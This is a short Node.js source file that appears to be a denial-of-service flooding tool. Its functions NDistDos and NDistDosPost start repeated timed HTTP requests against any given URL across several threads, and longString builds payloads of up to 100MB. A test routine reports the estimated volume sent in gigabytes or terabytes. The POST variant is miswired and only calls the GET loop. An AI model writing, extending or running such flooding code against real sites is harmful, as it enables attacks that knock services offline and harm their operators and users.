const axios = require('axios')
const nt = require("nodetime-js");

let time = nt.time; 
let t = nt.t;

function mk(url) {
  axios.get(url)
}

function mkPost(url, data) {
  axios.post(url, data)
}

function NDistDos(url, threads=2, interval) {
  Array(threads).fill(1).forEach(thread => {
    ult(url, interval)
  })
}

function NDistDosPost(url, threads=2, interval) {
  Array(threads).fill(1).forEach(thread => {
    ult(url, interval)
  })
}
function ult(url_, interval_) {
  setInterval(()=>{
    mk(url_)
  }, interval_)
} 

function longString(msg, mb=10) {
  if (mb > 100) {
    throw new Error("Cap for string size is 100MB")
    return 
  }
  return msg.repeat((mb*1000000)/msg.length)
}

let sentMB = 0;
let mbps = 0;
function doTest(string, threads=1, computers=1, interval, time) {
  let st = new Date().getTime()/1000
  let iint = setInterval(()=>{
    sentMB += ((string.length/1000000)*threads)*computers
  }, interval)
  setTimeout(()=>{
    let et = new Date().getTime()/1000
    clearInterval(iint)
    console.log(`Test done. Time elapsed: ${et-st}`)
    if (sentMB < 1000) {
      console.log(`Total data: ${sentMB/1000}GB  with a rate of ${(sentMB/1000)/time} gBps`)
      console.log("gBps = Gigabytes per second")
    } else if (sentMB >= 1000) {
      console.log(`Total data: ${(sentMB/1000)/1000}TB with a rate of ${((sentMB/1000)/1000)/time} tBps`)
      console.log("tBps = Terabytes per second")
    }
  }, time*1000)
}
  

